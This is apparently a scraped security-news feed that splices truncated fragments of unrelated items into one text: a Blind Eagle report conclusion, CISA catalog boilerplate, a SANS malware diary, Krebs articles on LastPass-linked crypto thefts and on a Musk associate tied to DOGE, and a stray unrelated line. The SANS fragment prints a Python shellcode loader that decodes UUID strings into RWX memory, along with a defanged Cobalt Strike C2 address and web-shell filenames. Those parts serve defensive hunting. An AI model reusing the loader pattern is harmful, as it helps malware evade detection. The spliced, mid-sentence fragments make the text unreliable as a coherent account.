&lt;p&gt;Even though &lt;strong&gt;Blind Eagle&lt;/strong&gt; uses this command the most, utilizing this .NET RAT as a simple downloader, the malware also contains other functionalities, such as downloading the next payload on disk, maintaining persistence via scheduled tasks, or even executing PowerShell scripts.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31229" height="398" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img16.png" width="671" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 18&lt;/strong&gt; &amp;#8211; Powershell file execution.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h2 class="wp-block-heading"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;Blind Eagle remains one of the most active and dangerous threat actors in Latin America, with a particular focus on Colombia’s public and private sectors. The group’s scale and persistence are evident, with over &lt;strong&gt;1,600&lt;/strong&gt; infections recorded from a single campaign. Long suspected of originating in Latin America, the confirmation of its &lt;strong&gt;UTC-5&lt;/strong&gt; operating timezone further narrows its likely base of operations to several &lt;strong&gt;South American&lt;/strong&gt; countries.&lt;/p&gt;



&lt;p&gt;Despite Microsoft&amp;#8217;s release of a patch for &lt;strong&gt;CVE-2024-43451&lt;/strong&gt; on &lt;strong&gt;November 12, 2024&lt;/strong&gt;, Blind Eagle quickly adapted, introducing a variant of the “exploit” in just &lt;strong&gt;six days&lt;/strong&gt;. This rapid response highlights the group’s technical expertise, adaptability, and relentless pursuit of new attack methods. By incorporating malicious &lt;code&gt;.url&lt;/code&gt; files into its arsenal, Blind Eagle continues to refine its tactics, ensuring its malware distribution remains effective against evolving security defenses.&lt;/p&gt;



&lt;p&gt;A key factor in its success is its ability to exploit legitimate file-sharing platforms, including &lt;strong&gt;Google Drive&lt;/strong&gt;, &lt;strong&gt;Dropbox&lt;/strong&gt;, &lt;strong&gt;Bitbucket&lt;/strong&gt;, and &lt;strong&gt;GitHub&lt;/strong&gt;, allowing it to bypass traditional security measures and distribute malware stealthily. Additionally, its use of underground crimeware tools such as &lt;strong&gt;Remcos RAT&lt;/strong&gt;, &lt;strong&gt;HeartCrypt&lt;/strong&gt;, and &lt;strong&gt;PureCrypter&lt;/strong&gt; reinforces its deep ties to the cybercriminal ecosystem, granting access to sophisticated evasion techniques and persistent access methods.&lt;/p&gt;



&lt;p&gt;Blind Eagle’s rapid evolution, effective social engineering tactics, and focus on both public and private sector entities make it a critical cybersecurity threat. Mitigating its impact requires proactive threat intelligence, advanced security defenses, and continuous monitoring. Organizations must remain vigilant against phishing campaigns, file-based malware delivery, and unconventional attack techniques to stay ahead of this ever-adapting adversary.&lt;/p&gt;

&lt;/ul&gt;
&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&lt;a&gt;&amp;nbsp;&lt;/a&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice.

One key tip I give to my students is to keep an eye on "strange" API calls. In the Windows ecosystem, Microsoft offers tons of API calls to developers. The fact that an API is used in a program does not always mean we are facing malicious code, but sometimes, some of them are derived from their official purpose. One of my hunting rules for malicious scripts is to search for occurrences of the ctypes&amp;#x5b;&lt;a href="https://docs.python.org/3/library/ctypes.html"&gt;2&lt;/a&gt;&amp;#x5d; library. It allows Python to call functions in DLLs or shared libraries.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;I returned from another FOR610[&lt;a href="https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/"&gt;1&lt;/a&gt;] class last week in London. One key tip I give to my students is to keep an eye on &amp;quot;strange&amp;quot; API calls. In the Windows ecosystem, Microsoft offers tons of API calls to developers. The fact that an API is used in a program does not always mean we are facing malicious code, but sometimes, some of them are derived from their official purpose. One of my hunting rules for malicious scripts is to search for occurrences of the ctypes[&lt;a href="https://docs.python.org/3/library/ctypes.html"&gt;2&lt;/a&gt;] library. It allows Python to&amp;nbsp;call functions in DLLs or shared libraries.&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
import ctypes
new_page = ctypes.windll.kernel32.VirtualAlloc(0, page_size, 4096, 64)&lt;/pre&gt;

&lt;p&gt;I spotted a malicious Python script that uses the following API call:&amp;nbsp;&lt;code&gt;UuidFromStringA()&lt;/code&gt;. This&amp;nbsp;function converts a UUID string to its binary format.&amp;nbsp;&lt;/p&gt;

&lt;p&gt;A UUID (Universally Unique Identifier) is a 128-bit value commonly used in software systems to provide a practically guaranteed unique reference. It is represented as a string of hexadecimal digits often divided into five groups. Because of their structure and generation process (timestamp-based or random), UUIDs have an extremely low chance of collision, making them ideal for identifying objects or records across distributed systems where a central authority to track uniqueness[&lt;a href="https://www.uuidtools.com/decode"&gt;4&lt;/a&gt;] may not exist.&lt;/p&gt;

&lt;p&gt;The Python script I found contained an array of UUIDs that, once decoded in raw bytes, was injected in memory as a shellcode:&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/isc-20250310-1.png" style="width: 1000px; height: 183px;" /&gt;&lt;/p&gt;

&lt;p&gt;This technique allows the malware to remain below the radar because the VT score is only 2/61! Its SHA256 is 63733d412c82958055a8125e1499d695aa1e810b3577c6e849a90012c52da929[&lt;a href="https://www.virustotal.com/gui/file/63733d412c82958055a8125e1499d695aa1e810b3577c6e849a90012c52da929"&gt;5&lt;/a&gt;].&lt;/p&gt;

&lt;p&gt;The code is decoded with a simple loop then injected in memory:&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
for i in shellcode:
    io = ctypes.windll.Rpcrt4.UuidFromStringA(i, rwxpage1)
    rwxpage1 += 16&lt;/pre&gt;

&lt;p&gt;This&amp;nbsp;code is a&amp;nbsp;CobaltStrike HTTP x86 shellcode&amp;nbsp;beaconing to: hxxp://182[.]61[.]60[.]141:6666/tFl6.&lt;/p&gt;

&lt;p&gt;Indeed, it is pretty easy&amp;nbsp;to convert a binary file into an array of UUIDs. You need to read the shellcode in 16-byte chunks (each UUID is 128 bits, or 16 bytes) and interpret each chunk as a UUID. This technique has already been used by the Lazarus group in the past[&lt;a href="https://www.nccgroup.com/us/research-blog/rift-analysing-a-lazarus-shellcode-execution-method/"&gt;6&lt;/a&gt;].&lt;/p&gt;

&lt;p&gt;Attackers often deploy web shells via file upload or remote code execution vulnerabilities. Standard webshells are available for a wide range of web development environments. The advantage to the attacker is that followup exploits are easily disguised as &amp;quot;regular&amp;quot; HTTP requests.&lt;/p&gt;

&lt;p&gt;Here are some of the web shells I have observed recently:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;tt&gt;teorema505&lt;br /&gt;
upl.php&lt;br /&gt;
/download/powershell/&lt;br /&gt;
alive.php&lt;/tt&gt;&lt;/p&gt;

&lt;p&gt;Look at your server to see if you can find any odd files (not just the files above). Web shells are easily overlooked if you do not have a good code promotion procedure. The list above is nothing but a &amp;quot;first guess,&amp;quot; and there are many more.&lt;/p&gt;

&lt;p&gt;Also, make sure not to install your own unauthenticated web shells. We still see many development tools like '/struts/webconsole.html' being used to attack sites.&lt;/p&gt;

&lt;p&gt;Got any webshell related URL that you see hit a lot?&lt;/p&gt;

In a court filing this week, U.S. federal agents investigating a spectacular $150 million cryptocurrency heist said they had reached the same conclusion.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter size-medium wp-image-31264" height="132" src="https://krebsonsecurity.com/wp-content/uploads/2015/06/lastpass-580x132.png" width="580" /&gt;&lt;/p&gt;
&lt;p&gt;On March 6, federal prosecutors in northern California said they seized approximately $24 million worth of cryptocurrencies that were clawed back following a $150 million cyberheist on Jan. 30, 2024. The complaint refers to the person robbed only as &amp;#8220;Victim-1,&amp;#8221; but according to blockchain security researcher &lt;strong&gt;ZachXBT&lt;/strong&gt; the theft was perpetrated against &lt;strong&gt;Chris Larsen&lt;/strong&gt;, the co-founder of the cryptocurrency platform &lt;strong&gt;Ripple&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;ZachXBT was the &lt;a href="https://x.com/zachxbt/status/1752694489905528943" rel="noopener" target="_blank"&gt;first to report on the heist&lt;/a&gt;, of which approximately $24 million was frozen by the feds before it could be withdrawn. This week&amp;#8217;s action by the government merely allows investigators to officially seize the frozen funds.&lt;/p&gt;
&lt;p&gt;But there is an important conclusion in this seizure document: It basically says the &lt;strong&gt;U.S. Secret Service&lt;/strong&gt; and the &lt;strong&gt;FBI&lt;/strong&gt; agree with the findings of &lt;a href="https://krebsonsecurity.com/2023/09/experts-fear-crooks-are-cracking-keys-stolen-in-lastpass-breach/" rel="noopener" target="_blank"&gt;the LastPass breach story published here in September 2023&lt;/a&gt;. That piece quoted security researchers who said they were witnessing six-figure crypto heists several times each month that they believed all appeared to be the result of crooks cracking master passwords for the password vaults stolen from LastPass in 2022.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The Federal Bureau of Investigation has been investigating these data breaches, and law enforcement agents investigating the instant case have spoken with FBI agents about their investigation,&amp;#8221; reads the seizure complaint, which was written by a U.S. Secret Service agent. &amp;#8220;From those conversations, law enforcement agents in this case learned that the stolen data and passwords that were stored in several victims’ online password manager accounts were used to illegally, and without authorization, access the victims’ electronic accounts and steal information, cryptocurrency, and other data.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The document continues:&lt;/p&gt;
&lt;p&gt;&amp;#8220;Based on this investigation, law enforcement had probable cause to believe the same attackers behind the above-described commercial online password manager attack used a stolen password held in Victim 1’s online password manager account and, without authorization, accessed his cryptocurrency wallet/account.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Working with dozens of victims, security researchers &lt;strong&gt;Nick Bax&lt;/strong&gt; and &lt;strong&gt;Taylor Monahan&lt;/strong&gt; found that none of the six-figure cyberheist victims appeared to have suffered the sorts of attacks that typically preface a high-dollar crypto theft, such as the compromise of one’s email and/or mobile phone accounts, or SIM-swapping attacks.&lt;/p&gt;
&lt;p&gt;They discovered the victims all had something else in common: Each had at one point stored their cryptocurrency seed phrase &amp;#8212; the secret code that lets anyone gain access to your cryptocurrency holdings &amp;#8212; in the &amp;#8220;Secure Notes&amp;#8221; area of their LastPass account prior to the 2022 breaches at the company.&lt;/p&gt;
&lt;p&gt;Bax and Monahan found another common theme with these robberies: They all followed a similar pattern of cashing out, rapidly moving stolen funds to a dizzying number of drop accounts scattered across various cryptocurrency exchanges.&lt;/p&gt;
&lt;p&gt;According to the government, a similar level of complexity was present in the $150 million heist against the Ripple co-founder last year.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The scale of a theft and rapid dissipation of funds would have required the efforts of multiple malicious actors, and was consistent with the online password manager breaches and attack on other victims whose cryptocurrency was stolen,&amp;#8221; the government wrote. &amp;#8220;For these reasons, law enforcement agents believe the cryptocurrency stolen from Victim 1 was committed by the same attackers who conducted the attack on the online password manager, and cryptocurrency thefts from other similarly situated victims.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Reached for comment, LastPass said it has seen no definitive proof &amp;#8212; from federal investigators or others &amp;#8212; that the cyberheists in question were linked to the LastPass breaches.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Since we initially disclosed this incident back in 2022, LastPass has worked in close cooperation with multiple representatives from law enforcement,&amp;#8221; LastPass said in a written statement. &amp;#8220;To date, our law enforcement partners have not made us aware of any conclusive evidence that connects any crypto thefts to our incident. In the meantime, we have been investing heavily in enhancing our security measures and will continue to do so.&amp;#8221;&lt;span id="more-70634"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;On August 25, 2022, &lt;strong&gt;LastPass CEO Karim Toubba&lt;/strong&gt; told users the company had detected unusual activity in its software development environment, and that the intruders stole some source code and proprietary LastPass technical information. On Sept. 15, 2022, LastPass said an investigation into the August breach determined the attacker did not access any customer data or password vaults.&lt;/p&gt;
&lt;p&gt;But on Nov. 30, 2022, LastPass notified customers about another, far more serious security incident that the company said leveraged data stolen in the August breach. LastPass disclosed that criminal hackers had compromised encrypted copies of some password vaults, as well as other personal information.&lt;/p&gt;
&lt;p&gt;Experts say the breach would have given thieves &amp;#8220;offline&amp;#8221; access to encrypted password vaults, theoretically allowing them all the time in the world to try to crack some of the weaker master passwords using powerful systems that can attempt millions of password guesses per second.&lt;/p&gt;
&lt;p&gt;Researchers found that many of the cyberheist victims had chosen master passwords with relatively low complexity, and were among LastPass&amp;#8217;s oldest customers. That&amp;#8217;s because legacy LastPass users were more likely to have master passwords that were protected with far fewer &amp;#8220;iterations,&amp;#8221; which refers to the number of times your password is run through the company&amp;#8217;s encryption routines. In general, the more iterations, the longer it takes an offline attacker to crack your master password.&lt;/p&gt;
&lt;p&gt;Over the years, LastPass forced new users to pick longer and more complex master passwords, and they increased the number of iterations on multiple occasions by several orders of magnitude. But researchers found strong indications that LastPass never succeeded in upgrading many of its older customers to the newer password requirements and protections.&lt;/p&gt;
&lt;p&gt;Asked about LastPass&amp;#8217;s continuing denials, Bax said that after the initial warning in our 2023 story, he naively hoped people would migrate their funds to new cryptocurrency wallets.&lt;/p&gt;
&lt;p&gt;&amp;#8220;While some did, the continued thefts underscore how much more needs to be done,&amp;#8221; Bax told KrebsOnSecurity. &amp;#8220;It&amp;#8217;s validating to see the Secret Service and FBI corroborate our findings, but I’d much rather see fewer of these hacks in the first place. ZachXBT and &lt;a href="https://x.com/_SEAL_Org/status/1868805837311074576" rel="noopener" target="_blank"&gt;SEAL 911 reported yet another wave of thefts&lt;/a&gt; as recently as December, showing the threat is still very real.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Monahan said LastPass still hasn’t alerted their customers that their secrets—especially those stored in “Secure Notes”—may be at risk.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Its been two and a half years since LastPass was first breached [and] hundreds of millions of dollars has been stolen from individuals and companies around the globe,&amp;#8221; Monahan said. &amp;#8220;They could have encouraged users to rotate their credentials. They could’ve prevented millions and millions of dollars from being stolen by these threat actors. But  instead they chose to deny that their customers were are risk and blame the victims instead.&amp;#8221;&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70634</guid><category>A Little Sunshine</category><category>Data Breaches</category><category>Chris Larsen</category><category>fbi</category><category>Karim Toubba</category><category>lastpass breach</category><category>Nick Bax</category><category>Ripple</category><category>Taylor Monahan</category><category>U.S. Secret Service</category><category>ZachXBT</category></item><item><title>Rayhunter: Device to Detect Cellular Surveillance</title><link>https://www.schneier.com/blog/archives/2025/03/rayhunter-device-to-detect-cellular-surveillance.html</link><description>&lt;p&gt;The EFF has &lt;a href="https://www.eff.org/deeplinks/2025/03/meet-rayhunter-new-open-source-tool-eff-detect-cellular-spying"&gt;created&lt;/a&gt; an open-source hardware tool to detect IMSI catchers: fake cell phone towers that are used for mass surveillance of an area.&lt;/p&gt;

As the current director of information technology at &lt;strong&gt;X/Twitter&lt;/strong&gt; and an early hire at &lt;strong&gt;PayPal&lt;/strong&gt;, &lt;strong&gt;Zip2&lt;/strong&gt;,&lt;strong&gt; Tesla&lt;/strong&gt; and &lt;strong&gt;SpaceX&lt;/strong&gt;, Spikes is also among Musk&amp;#8217;s most loyal employees. Here&amp;#8217;s a closer look at this trusted Musk lieutenant, whose Russian ex-wife was once married to Elon&amp;#8217;s cousin.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70586" style="width: 601px;"&gt;&lt;img alt="" class="size-full wp-image-70586" height="533" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/x-spikes.png" width="591" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70586"&gt;The profile of Branden Spikes on X.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;When President Trump took office again in January, he put the world&amp;#8217;s richest man &amp;#8212; Elon Musk &amp;#8212; in charge of the &lt;strong&gt;U.S. Digital Service&lt;/strong&gt;, and renamed the organization as DOGE. The group is reportedly staffed by &lt;a href="https://www.nytimes.com/interactive/2025/02/27/us/politics/doge-staff-list.html" rel="noopener" target="_blank"&gt;at least 50 technologists&lt;/a&gt;, many of whom have ties to Musk&amp;#8217;s companies.&lt;/p&gt;
&lt;p&gt;DOGE has been enabling the president&amp;#8217;s ongoing mass layoffs and firings of federal workers, largely by seizing control over computer systems and government data for a multitude of federal agencies, including the Social Security Administration, the Department of Homeland Security, the Office of Personnel Management, and the Treasury Department.&lt;/p&gt;
&lt;p&gt;It is difficult to find another person connected to DOGE who has stronger ties to Musk than Branden Spikes. A native of California, Spikes initially teamed up with Musk in 1997 as a lead systems engineer for the software company Zip2, the first major venture for Musk. In 1999, Spikes was hired as director of IT at PayPal, and in 2002 he became just the fourth person hired at SpaceX.&lt;/p&gt;
&lt;p&gt;In 2012, Spikes launched &lt;strong&gt;Spikes Security&lt;/strong&gt;, a software product that sought to create a compartmentalized or &amp;#8220;sandboxed&amp;#8221; web browser that could insulate the user from malware attacks. A review of spikes.com in the Wayback Machine shows that as far back as 1998, Musk could be seen joining Spikes for team matches in the online games Quake and Quake II. In 2016, Spikes Security was merged with another security suite called Aurionpro, with the combined company renamed Cyberinc.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70608" style="width: 758px;"&gt;&lt;img alt="" class=" wp-image-70608" height="682" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/spikesquake.png" width="748" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70608"&gt;A snapshot of spikes.com from 1998 shows Elon Musk&amp;#8217;s profile in Spike&amp;#8217;s clan for the games Quake and Quake II.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Spikes&amp;#8217;s &lt;a href="https://www.linkedin.com/in/brandenspikes/" rel="noopener" target="_blank"&gt;LinkedIn profile&lt;/a&gt; says he was appointed head of IT at X in February 2025. And although his name shows up on none of the lists of DOGE employees circulated by various media outlets, multiple sources told KrebsOnSecurity that Spikes was working with DOGE and operates within Musk&amp;#8217;s inner circle of trust.&lt;/p&gt;
&lt;p&gt;In a conversation with KrebsOnSecurity, Spikes said he is dedicated to his country and to saving it from what he sees as certain ruin.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Myself, I was raised by a southern conservative family in California and I strongly believe in America and her future,&amp;#8221; Spikes said. &amp;#8220;This is why I volunteered for two months in DC recently to help DOGE save us from certain bankruptcy.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Spikes told KrebsOnSecurity that he recently decided to head back home and focus on his job as director of IT at X.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I loved it, but ultimately I did not want to leave my hometown and family back in California,&amp;#8221; Spikes said of his tenure at DOGE. &amp;#8220;After a couple of months it became clear that to continue helping I would need to move to DC and commit a lot more time, so I politely bowed out.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Prior to founding Spikes Security, Branden Spikes was married to a native Russian woman named &lt;strong&gt;Natalia&lt;/strong&gt; whom he&amp;#8217;d met at a destination wedding in South America in 2003.&lt;/p&gt;
&lt;p&gt;Branden and Natalia&amp;#8217;s names are both on the registration records for the domain name &lt;strong&gt;orangetearoom[.]com&lt;/strong&gt;. This domain, which DomainTools.com says was originally registered by Branden in 2009, is the home of a tax-exempt charity in Los Angeles called the &lt;a href="https://web.archive.org/web/20141221061648/http://www.russiancalifornia.org/" rel="noopener" target="_blank"&gt;&lt;strong&gt;California Russian Association&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Here is a photo from a 2011 event organized by the California Russian Association, showing Branden and Natalia at one of its &amp;#8220;White Nights&amp;#8221; charity fundraisers:&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70585" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-70585" height="564" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/spikes-heritage.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70585"&gt;Branden and Natalia Spikes, on left, in 2011. The man on the far right is Ivan Y. Podvalov, a board member of the Kremlin-aligned Congress of Russian Americans (CRA). The man in the center is Feodor Yakimoff, director of operations at the Transib Global Sourcing Group, and chairman of the Russian Imperial Charity Balls, which works in concert with the Russian Heritage Foundation.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;In 2011, the Spikes couple got divorced, and Natalia changed her last name to Haldeman. That is not her maiden name, which appears to be &amp;#8220;Libina.&amp;#8221; Rather, Natalia acquired the surname Haldeman in 1998, when she married Elon Musk&amp;#8217;s cousin.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Reeve Haldeman&lt;/strong&gt; is the son of &lt;strong&gt;Scott Haldeman&lt;/strong&gt;, who is the brother of Elon Musk&amp;#8217;s mother, &lt;strong&gt;Maye Musk&lt;/strong&gt;. Divorce records show Reeve and Natalia &lt;a href="https://unicourt.com/case/ca-ora2-haldeman-v-haldeman-609208" rel="noopener" target="_blank"&gt;officially terminated&lt;/a&gt; their marriage in 2007. Reeve Haldeman did not respond to a request for comment.&lt;span id="more-70579"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;A review of other domain names connected to Natalia Haldeman&amp;#8217;s email address show she has registered more than a dozen domains over the years that are tied to the California Russian Association, and an apparently related entity called the &lt;strong&gt;Russian Heritage Foundation, Inc.&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;russianamericans.org&lt;br /&gt;

&lt;p&gt;Ms. Haldeman did not respond to requests for comment. Her name and contact information appears in the registration records for these domains dating back to 2010, and &lt;a href="https://projects.propublica.org/nonprofits/organizations/452775704 California Russian Foundation" rel="noopener" target="_blank"&gt;a document&lt;/a&gt; published by &lt;em&gt;ProPublica&lt;/em&gt; show that by 2016 Natalia Haldeman was appointed CEO of the California Russian Foundation.&lt;/p&gt;
&lt;p&gt;The domain name that bears both Branden&amp;#8217;s and Natalia&amp;#8217;s names &amp;#8212; orangetearoom.com &amp;#8212; features photos of Ms. Haldeman at fundraising events for the Russian foundation through 2014. Additional photos of her and many of the same people can be seen through 2023 at another domain she registered in 2010 &amp;#8212; &lt;strong&gt;russianheritagefoundation.com&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70630" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-70630" height="429" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/haldeman-mayemusk-1.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70630"&gt;A photo from Natalia Haldeman&amp;#8217;s Facebook page shows her mother (left) pictured with Maye Musk, Elon Musk&amp;#8217;s mother, in 2022.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;The photo of Branden and Natalia above is from one such event in 2011 (tied to russianwhitenights.org, another Haldeman domain). The person on the right in that image &amp;#8212; &lt;strong&gt;Ivan Y. Podvalov&lt;/strong&gt; &amp;#8212; appears in many fundraising event photos published by the foundation over the past decade. Podvalov is a board member of the &lt;strong&gt;Congress of Russian Americans&lt;/strong&gt; (CRA), a nonprofit group that is known for vehemently opposing U.S. financial and legal sanctions against Russia.&lt;/p&gt;
&lt;p&gt;Writing for &lt;em&gt;The Insider&lt;/em&gt; in 2022, journalist &lt;strong&gt;Diana Fishman&lt;/strong&gt; described how the CRA has engaged in outright political lobbying, noting that the organization in June 2014 sent a letter to President Obama and the secretary of the United Nations, calling for an end to the &amp;#8220;large-scale US intervention in Ukraine and the campaign to isolate Russia.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;The US military contingents must be withdrawn immediately from the Eastern European region, and NATO&amp;#8217;s enlargement efforts and provocative actions against Russia must cease,” the message read.&lt;/p&gt;
&lt;p&gt;The Insider said the CRA director sent another two letters, this time to President Donald Trump, in 2017 and 2018.&lt;/p&gt;
&lt;p&gt;&amp;#8220;One was a request not to sign a law expanding sanctions against Russia,&amp;#8221; Fishman &lt;a href="https://theins.ru/en/politics/256825" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt;. &amp;#8220;The other regretted the expulsion of 60 Russian diplomats from the United States and urged not to jump to conclusions on Moscow&amp;#8217;s involvement in the poisoning of Sergei Skripal.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The nonprofit tracking website CauseIQ.com &lt;a href="https://www.causeiq.com/organizations/russian-heritage-foundation,831537424/" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; that The Russian Heritage Foundation, Inc. is now known as &lt;strong&gt;Constellation of Humanity&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The Russian Heritage Foundation and the California Russian Association both promote the interests of &lt;a href="https://cepa.org/article/an-unorthodox-russian-vision-of-heaven-and-hell/" rel="noopener" target="_blank"&gt;the Russian Orthodox Church&lt;/a&gt;. &lt;a href="https://web.archive.org/web/20141119232054/http://www.russiancalifornia.org/russian-orthodox-church-orange-county/" rel="noopener" target="_blank"&gt;This page&lt;/a&gt; indexed by Archive.org from russiancalifornia.org shows The California Russian Foundation organized a community effort to establish an Orthodox church in Orange County, Calif.&lt;/p&gt;
&lt;p&gt;A press release from the &lt;strong&gt;Russian Orthodox Church Outside of Russia&lt;/strong&gt; (ROCOR) shows that in 2021 the Russian Heritage Foundation &lt;a href="https://www.rocorstudies.org/2021/03/09/russian-heritage-foundation-supports-our-work/" rel="noopener" target="_blank"&gt;donated money&lt;/a&gt; to organize a conference for the Russian Orthodox Church in Serbia.&lt;/p&gt;
&lt;p&gt;A review of the &amp;#8220;&lt;a href="https://orangetearoom.com/index.php/network/about-us" rel="noopener" target="_blank"&gt;Partners&lt;/a&gt;&amp;#8221; listed on the Spikes&amp;#8217; jointly registered domain &amp;#8212; orangetearoom.com &amp;#8212; shows the organization worked with a marketing company called &lt;strong&gt;Russian American Media&lt;/strong&gt;. &lt;a href="https://krebsonsecurity.com/2024/03/a-close-up-look-at-the-consumer-data-broker-radaris/" rel="noopener" target="_blank"&gt;Reporting by KrebsOnSecurity last year&lt;/a&gt; showed that Russian American Media also partners with the problematic people-search service &lt;strong&gt;Radaris&lt;/strong&gt;, which was formed by two native Russian brothers in Massachusetts who have built a fleet of consumer data brokers and Russian affiliate programs.&lt;/p&gt;
&lt;p&gt;When asked about his ex-wife&amp;#8217;s history, Spikes said she has a good heart and bears no ill-will toward anyone.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I attended several of Natalia&amp;#8217;s social events over the years we were together and can assure you that she&amp;#8217;s got the best intentions with those,&amp;#8221; Spikes told KrebsOnSecurity. &amp;#8220;There&amp;#8217;s no funny business going on. It is just a way for those friendly immigrants to find resources amongst each other to help get settled in and chase the American dream. I mean, they&amp;#8217;re not unlike the immigrants from other countries who come to America and try to find each other and help each other find others who speak the language and share in the building of their businesses here in America.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Spikes said his own family roots go back deeply into American history, sharing that his 6th great grandfather was Alexander Hamilton on his mom&amp;#8217;s side, and Jessie James on his dad&amp;#8217;s side.&lt;/p&gt;
&lt;p&gt;&amp;#8220;My family roots are about as American as you can get,&amp;#8221; he said. &amp;#8220;I&amp;#8217;ve also been entrusted with building and safeguarding Elon&amp;#8217;s companies since 1999 and have a keen eye (as you do) for bad actors, so have enough perspective to tell you that Natalia has no bad blood and that she loves America.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Of course, this perspective comes from someone who has the utmost regard for the interests of the &amp;#8220;special government employee&amp;#8221; Mr. Musk, who has been bragging about tossing entire federal agencies into the &amp;#8220;wood chipper,&amp;#8221; and who recently &lt;a href="https://apnews.com/article/musk-chainsaw-trump-doge-6568e9e0cfc42ad6cdcfd58a409eb312" rel="noopener" target="_blank"&gt;wielded an actual chainsaw&lt;/a&gt; on stage while referring to it as the &amp;#8220;chainsaw for bureaucracy.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;Elon&amp;#8217;s intentions are good and you can trust him,&amp;#8221; Spikes assured.&lt;/p&gt;

I am truly honored to support my amazing women colleagues who continue to excel in their careers and am grateful to have so many allies who have extended their hands to help guide and shape me to the person I am today.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



